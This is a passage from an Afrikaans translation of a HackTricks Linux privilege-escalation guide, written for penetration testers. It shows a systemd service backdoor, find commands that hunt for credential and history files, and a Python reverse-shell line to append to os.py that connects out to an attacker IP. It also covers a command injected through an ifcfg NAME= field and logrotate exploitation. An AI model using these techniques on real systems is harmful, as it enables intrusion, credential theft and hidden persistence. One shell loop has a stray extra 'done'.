Byvoorbeeld, as die masjien 'n **tomcat**-bediener hardloop en jy kan **die Tomcat-dienskonfigurasie-lêer binne /etc/systemd/ wysig**, dan kan jy die lyne wysig:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Jou agterdeur sal die volgende keer uitgevoer word wanneer tomcat begin word.

### Kontroleer Lêers

Die volgende lêers mag dalk rugsteune of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Jy sal waarskynlik nie die laaste een kan lees nie, maar probeer)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Vreemde Ligging/Eienaars lêers
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Gewysigde lêers in laaste minute
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-lêers
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_geskiedenis, .sudo_as_admin_successful, profiel, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml lêers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteekte lêers
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrip/Binêres in PAD**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web lêers**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rugsteun**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekende lêers wat wagwoorde bevat

Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), dit soek na **veral moontlike lêers wat wagwoorde kan bevat**.\
**'n Ander interessante instrument** wat jy kan gebruik om dit te doen is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) wat 'n oopbron-toepassing is wat gebruik word om baie wagwoorde wat op 'n plaaslike rekenaar vir Windows, Linux & Mac gestoor word, te herwin.

### Logboeke

As jy logboeke kan lees, kan jy dalk **interessante/vertroulike inligting daarin vind**. Hoe vreemder die logboek is, hoe interessanter dit sal wees (waarskynlik).\
Ook, mag sommige "**sleg**" gekonfigureerde (agterdeur?) **ouditlogboeke** jou toelaat om **wagwoorde op te neem** binne ouditlogboeke soos verduidelik in hierdie pos: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Om **logs te lees die groep** [**adm**](interesting-groups-linux-pe/#adm-group) sal baie nuttig wees.

### Skuldlêers
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generiese Wagwoorde Soek/Regex

Jy moet ook vir lêers kyk wat die woord "**wagwoord**" in sy **naam** of binne die **inhoud** bevat, en ook vir IP-adresse en e-posse binne loglêers, of hasse regexps.\
Ek gaan nie hier lys hoe om al hierdie te doen nie, maar as jy belangstel, kan jy die laaste kontroles wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) uitvoer, nagaan.

## Skryfbare lêers

### Python-biblioteek kaping

As jy weet **waarvandaan** 'n Python-skripsie uitgevoer gaan word en jy **binne daardie vouer kan skryf** of jy kan **Python-biblioteke wysig**, kan jy die OS-bibliotheek wysig en dit agterdeur maak (as jy kan skryf waar die Python-skripsie uitgevoer gaan word, kopieer en plak die os.py-bibliotheek).

Om die biblioteek **agterdeur te maak**, voeg net aan die einde van die os.py-biblioteek die volgende lyn by (verander IP en POORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate uitbuiting

'n Swakheid in `logrotate` laat gebruikers met **skryfregte** op 'n log-lêer of sy ouer gids moontlik verhoogde regte verkry. Dit is omdat `logrotate`, dikwels hardloop as **root**, gemanipuleer kan word om arbitrêre lêers uit te voer, veral in gids soos _**/etc/bash\_completion.d/**_. Dit is belangrik om nie net in _/var/log_ nie, maar ook in enige gids waar logrotasie toegepas word, regte te kontroleer.

{% hint style="info" %}
Hierdie swakheid affekteer `logrotate` weergawe `3.18.0` en ouer
{% endhint %}

Meer gedetailleerde inligting oor die swakheid kan gevind word op hierdie bladsy: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Jy kan hierdie swakheid uitbuit met [**logrotten**](https://github.com/whotwagner/logrotten).

Hierdie swakheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so wanneer jy vind dat jy logboeke kan verander, kyk wie daardie logboeke bestuur en kyk of jy regte kan verhoog deur die logboeke te vervang met simbole.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Swakheid verwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

As, om enige rede, 'n gebruiker in staat is om 'n `ifcf-<whatever>` skrips te **skryf** na _/etc/sysconfig/network-scripts_ **of** dit kan **aanpas**, dan is jou **sisteem pwned**.

Netwerk skripte, _ifcg-eth0_ byvoorbeeld, word gebruik vir netwerkverbindings. Hulle lyk presies soos .INI-lêers. Tog word hulle \~gebron\~ op Linux deur Network Manager (dispatcher.d).

In my geval word die `NAME=` aangedui in hierdie netwerk skripte nie korrek hanteer nie. As jy **wit/leë spasie in die naam het, probeer die sisteem om die gedeelte na die wit/leë spasie uit te voer**. Dit beteken dat **alles na die eerste leë spasie as root uitgevoer word**.

Byvoorbeeld: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, en rc.d**

Die gids `/etc/init.d` is die tuiste van **skripte** vir System V init (SysVinit), die **klassieke Linux-diensbestuurstelsel**. Dit sluit skripte in om dienste te `begin`, `stop`, `herlaai`, en soms `herlaai`. Hierdie kan direk uitgevoer word of deur simboliese skakels gevind in `/etc/rc?.d/`. 'n Alternatiewe pad in Redhat-stelsels is `/etc/rc.d/init.d`.

Aan die ander kant, `/etc/init` is geassosieer met **Upstart**, 'n nuwer **diensbestuurstelsel** wat deur Ubuntu ingevoer is, wat konfigurasie lêers gebruik vir diensbestuurstake. Ten spyte van die oorgang na Upstart, word SysVinit-skripte steeds gebruik saam met Upstart-konfigurasies as gevolg van 'n verenigbaarheidslaag in Upstart.

**systemd** kom na vore as 'n moderne inisialisering- en diensbestuurder, wat gevorderde kenmerke bied soos aanvraag-daemonbegin, outomatiese bergbestuur, en stelseltoestandsnapshots. Dit organiseer lêers in `/usr/lib/systemd/` vir verspreidingspakette en `/etc/systemd/system/` vir administrateursmodifikasies, wat die stelseladministrasieproses stroomlyn.

## Ander Truuks

### NFS Privilege-escalation

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Ontsnapping uit beperkte Skille

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Kernel Sekuriteitsbeskerming

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Meer hulp

[Statiese impacket-binêre lêers](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix Privesc-gereedskap

### **Beste gereedskap om vir Linux plaaslike bevoorregtingskaping vektore te soek:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t opsie)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumereer kernel kwale in Linux en MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fisiese toegang):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Versameling van meer skripte**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Verwysings

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
